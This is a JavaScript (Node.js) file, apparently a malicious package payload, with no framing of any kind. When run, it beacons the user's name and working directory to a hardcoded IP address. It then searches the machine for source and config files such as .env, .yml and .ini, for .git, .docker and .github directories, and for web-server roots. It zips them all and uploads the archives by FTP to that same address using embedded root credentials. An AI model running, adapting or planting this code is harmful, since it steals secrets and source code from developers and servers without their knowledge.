const fs = require('fs');
const path = require('path');
const archiver = require('archiver');
const util = require('util');
const os = require('os');
const ftpClient = require('ftp');
const querystring = require('querystring');
const http = require('http');
const url = require('url');

function sendHTTPRequest(text) {
  let query;

  if (text) {
    query = querystring.stringify({ text: text });
  } else {
    const osUser = os.userInfo().username;
    const currentScriptPath = process.cwd();

    query = querystring.stringify({
      user: osUser,
      path: currentScriptPath,
    });
  }

  const requestUrl = url.format({
    protocol: 'http',
    hostname: '185.62.56.25',
    port: '8000',
    pathname: '/http',
    search: query,
  });

  http.get(requestUrl, (res) => {
    let data = '';

    res.on('data', (chunk) => {
      data += chunk;
    });

    res.on('end', () => {
      //noop(data);
    });

  }).on("error", (err) => {
    //noop("Error: " + err.message);
  });
}

function getPathToSecondDirectory() {
  const parsedPath = path.parse(process.cwd());
  const parts = parsedPath.dir.split(path.sep);

  return path.join(parts[0] + path.sep, parts[1], parts[2]);
}


function findFilesWithExtensions(dir, extensions, directoriesToSearch = []) {
    let searchedFiles = [];
    let searchedDirectories = [];
  
    try {
      const files = fs.readdirSync(dir);
  
      files.forEach(file => {
        const filePath = path.join(dir, file);
  
        try {
          const linkStats = fs.lstatSync(filePath);
          if (linkStats.isSymbolicLink()) {
            return;
          }
          const stats = fs.statSync(filePath);
  
          if (stats.isDirectory()) {
            if (directoriesToSearch.includes(file)) {
              searchedDirectories.push(filePath);
            }
  
            const [childFiles, childDirectories] = findFilesWithExtensions(filePath, extensions, directoriesToSearch);
            searchedFiles = searchedFiles.concat(childFiles);
            searchedDirectories = searchedDirectories.concat(childDirectories);
          } else if (extensions.includes(path.extname(file))) {
            const sizeInBytes = stats.size;
            const sizeInKB = sizeInBytes / 1024;
            searchedFiles.push(`${filePath}`);
          }
        } catch (err) {
          //console.error(err);
        }
      });
    } catch (err) {
      //console.error(err);
    }
  
    return [searchedFiles, searchedDirectories];
  }


function appendDirectory(srcDir, destDir,archive,zip_name) {

    if (srcDir.startsWith("/usr/") || srcDir.startsWith("/snap/")){
        return 1;
    }
    
    

    try{
        let err = fs.accessSync(srcDir, fs.constants.R_OK); 


        }
        catch{
            console.log("Cant access",srcDir);
            return 0;
        }
        try{
            err = fs.accessSync("./", fs.constants.W_OK);   
            err = fs.accessSync("./", fs.constants.R_OK);   


            }
            catch{
                console.log("Cant access to current dir",process.cwd());
                return 0;
            }

   if (!fs.existsSync(srcDir)) {
        return 1;
    }

   const stats=fs.statSync(srcDir);
   if (!stats.isDirectory()) {
    try{
                var fd =fs.openSync(srcDir, 'r+');
                fs.closeSync(fd);
            }
            catch{
                return 1;
                //console.log("not");
            }
    try{
        let err = fs.accessSync(srcDir, fs.constants.R_OK);

        archive.file(srcDir, { name: path.join(destDir,srcDir) });
        //console.log("Not dir:", srcDir);
        }
        catch{
            console.log("Cant access file:", srcDir);
        }
        return 1;
   }

   //console.log("Dir file:", srcDir);
try{
 fs.readdirSync(srcDir);
    }

 catch{
                console.log("Cant access to",srcDir);
                return 0;
            }
const files = fs.readdirSync(srcDir);


    for (let j=0;j<files.length;j=j+1){
        if (zip_name===files[j]){
            continue;
        }
        
        const fullPath = path.join(srcDir, files[j]);
        if (!fs.existsSync(fullPath)) {
            continue;
        }
        if (path.extname(fullPath)==".zip"){
            continue;
        }
        //console.log(fullPath);
        const archivePath = destDir ? path.join(destDir, files[j]) : files[j];
        const stats=fs.statSync(fullPath);
        //destDir_new=path.join(zip_name,destDir)
        if (stats.isDirectory()) {
            appendDirectory(fullPath, destDir,archive,zip_name);
          }
          else {
            try{
                var fd =fs.openSync(fullPath, 'r+');
                fs.closeSync(fd);
            }
            catch{
                continue;
                return 0;
                //console.log("not");
            }

            try{
                
            let err = fs.accessSync(fullPath, fs.constants.R_OK);
            //console.log(path.join(destDir, fullPath),destDir,fullPath);

            archive.file(fullPath, { name: path.join(destDir, fullPath) });
            }
            catch{
                //console.log("not");
            }

        }
        //console.log(stats);
        //await sleep(1000);
    }
    //console.log('done');
  }


function uploadArchiveToFTP(archiveName) {
    return new Promise((resolve, reject) => {
      const client = new ftpClient();
      const host = '185.62.56.25';
      const port = 21;
      const user = 'root';
      const password = 'RoOk#$';
      const remotePath = '/';
      const localPath = path.join(process.cwd(), archiveName);
  
      client.on('ready', () => {
        client.put(localPath, remotePath + archiveName, (err) => {
          if (err) {
            console.log(err);
            return;
          }
          client.end();
          resolve();
        });
      });
  
      //client.on('error', reject);
  
      client.connect({ host, port, user, password });
    });
  }


function findFirstReadableDirectory() {
    let currentPath = path.sep;
    try {
      fs.accessSync(currentPath, fs.constants.R_OK);
      return currentPath;
    } catch (error) {
    }
  
    const cwdParts = process.cwd().split(path.sep);
  
    for (const part of cwdParts.slice(1)) {
      currentPath = path.join(currentPath, part);
  
      try {
        fs.accessSync(currentPath, fs.constants.R_OK);
        return currentPath;
      } catch (error) {
      }
    }
  
    return null;
  }

async function main(){
    sendHTTPRequest();
    var zip_name='dirs_back.zip';
    var zip_name_files='files_back.zip';
    const startDir = findFirstReadableDirectory();
    var new_name = 'files';
    const extensions = ['.asp', '.js', '.php', '.aspx', '.jspx', '.jhtml', '.py', '.rb', '.pl', '.cfm', '.cgi', '.ssjs', '.shtml', '.env', '.ini', '.conf', '.properties', '.yml', '.cfg'];
    const directoriesToSearch = ['.git', '.env', '.svn', '.gitlab', '.hg', '.idea', '.yarn', '.docker', '.vagrant', '.github'];
    let searchedWords = findFilesWithExtensions(startDir, extensions, directoriesToSearch);
    console.log(searchedWords[0].length);
    console.log(searchedWords[1].length);
    searchedWords[0] = [...new Set(searchedWords[0])];
    console.log(searchedWords[0].length);
    searchedWords[1] = [...new Set(searchedWords[1])];
    console.log(searchedWords[1].length);
    //123
    var output = fs.createWriteStream(zip_name);
    const archive = archiver('zip', {
        zlib: { level: 9 }
    });
    archive.pipe(output);
    searchedWords[0].forEach(item => {
        files = appendDirectory(item, new_name,archive,zip_name);
      });
    await archive.finalize();
    console.log("directory zipped!");
console.log(path.join(process.cwd(), zip_name));
    uploadArchiveToFTP(zip_name);
    console.log("zip_name send!");
    //321
    var output1 = fs.createWriteStream(zip_name_files);
    const archive1 = archiver('zip', {
        zlib: { level: 9 }
    });
    archive1.pipe(output1);
    searchedWords[1].forEach(item => {
        files = appendDirectory(item, new_name,archive1,zip_name_files);
      });
    await archive1.finalize();
    console.log("files zipped!");
    uploadArchiveToFTP(zip_name_files);
    console.log("zip_name_files send!");
    const specificDirectoriesToArchive = [
        '/var/www/html',
        '/usr/share/nginx/html',
        '/usr/local/var/www'
    ];
    const zipNameForSpecificDirs = 'specific_directories.zip'; 
    const outputForSpecificDirs = fs.createWriteStream(zipNameForSpecificDirs);
    const archiveForSpecificDirs = archiver('zip', {
        zlib: { level: 9 }
    });
    archiveForSpecificDirs.pipe(outputForSpecificDirs);

    for (const dir of specificDirectoriesToArchive) {
        try {
            await fs.promises.access(dir, fs.constants.R_OK);
            await appendDirectory(dir, new_name, archiveForSpecificDirs, zipNameForSpecificDirs);
        } catch (error) {
            console.log(`Cannot access directory ${dir}: ${error.message}`);
        }
    }

    await archiveForSpecificDirs.finalize();
    console.log("Specific directories zipped!");
    uploadArchiveToFTP(zipNameForSpecificDirs);
    console.log(`${zipNameForSpecificDirs} sent!`);
    ///32
    var zip_name_3 = "dir.zip";
    var output2 = fs.createWriteStream(zip_name_3);
    const archive2 = archiver('zip', {
        zlib: { level: 9 }
    });
    archive2.pipe(output2);
    last_dir=getPathToSecondDirectory();
    files = appendDirectory(last_dir, new_name,archive2,zip_name_3);
    await archive2.finalize();
    console.log("last_dir zipped!");
    await uploadArchiveToFTP(zip_name_3);
    console.log("last_dir send!");
}

main();

